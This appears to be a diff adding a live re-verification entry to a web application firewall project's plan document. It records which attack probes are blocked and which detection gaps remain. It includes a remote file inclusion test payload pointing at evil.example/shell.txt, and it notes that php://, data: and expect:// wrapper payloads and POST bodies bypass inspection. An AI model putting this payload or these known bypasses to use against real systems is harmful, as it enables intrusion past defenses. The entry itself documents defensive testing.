@@ -2545,6 +2545,22 @@ no effect; `[admin] port 8081` never listens.
 Run 01 first (unblocks browser testing). 02 needs 01 only for clean
 verification. 03 is independent, may proceed in parallel.
 
+Re-verified live 2026-10-30 (commit `2553e52`): fresh
+`cargo build --release --no-default-features` redeployed to the operator-local
+`~/prodtest` stack (blog `:5000`, WAF `:8082`, admin `:8081`, standalone
+supervisor+worker). Blog via WAF 200 with browser UA + IP `Referer`; SQLi,
+XSS, traversal, SSRF-metadata and blocked-path probes all 403; admin summary
+401/200, panel `/` 200 as a browser with external `bootstrap.js`, supervisor
+reports Standalone/Unified. Phase-02 A/B on the live site toggle:
+`?file=http://evil.example/shell.txt` logs `Rfi (score: 80) at query_string`
+with `[attack_detection.rfi] enabled=true` and `OpenRedirect (score: 30) at
+path` (still 403 via the open-redirect `file=` backstop) with
+`enabled=false`. Residuals, not blockers (detector coverage for a future
+pass, no unit coverage today): `php://`/`data:`/`expect://` wrapper RFI
+patterns do not fire on query strings at paranoia 2 (only `=http(s)://` and
+`=ftp://` encoded forms match there); POST bodies pass uninspected through
+the fallback-proxy path (query/headers/path are inspected).
+
 ## Admin Panel Operator-Correctness Series — Ready
 
 Status: **READY** on proposed branch `plans/admin-panel-operator-correctness`. Umbrella:
